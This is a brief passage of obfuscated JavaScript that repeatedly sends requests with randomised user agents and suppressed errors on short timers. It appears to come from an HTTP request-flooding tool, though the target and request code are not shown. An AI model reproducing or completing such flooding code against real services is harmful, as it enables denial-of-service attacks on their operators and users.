        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x271d + -0x34c9 * -0x1 + 0xdac) * getRandomInt(-0x312 + 0x108a + -0x47d * 0x3, 0x7 * -0x59 + -0x494 + 0x708));
}, -0x141 * 0x1 + 0x11c3 * -0x1 + 0x1368);